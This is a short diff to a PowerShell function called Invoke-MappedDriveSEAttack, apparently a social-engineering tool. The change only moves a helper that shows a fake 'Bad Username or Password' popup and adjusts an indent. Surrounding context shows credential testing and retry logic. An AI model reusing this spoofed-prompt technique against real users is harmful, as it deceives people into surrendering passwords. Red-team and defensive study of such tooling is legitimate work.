@@ -71,12 +71,6 @@ Function Invoke-MappedDriveSEAttack
     
     Add-Type -TypeDefinition $Source -PassThru -Language CSharp
 
-    function Error-BadCredentialsPrompt
-    {
-        $wshell = New-Object -ComObject Wscript.Shell
-        $wshell.Popup('Bad Username or Password',0,'Failed Authentication',0x0+0x10)
-    }
-
     function Test-Credentials
     {
         Param($username,$password,$domain)
@@ -94,8 +88,13 @@ Function Invoke-MappedDriveSEAttack
         }
     }
 
+    function Error-BadCredentialsPrompt
+    {
+        $wshell = New-Object -ComObject Wscript.Shell
+        $wshell.Popup('Bad Username or Password',0,'Failed Authentication',0x0+0x10)
+    }
           
-	$Drive = $Drive + ':\'		
+    $Drive = $Drive + ':\'		
     $credentials = @()
     $retryCount = 0
     $ValidCreds = $false
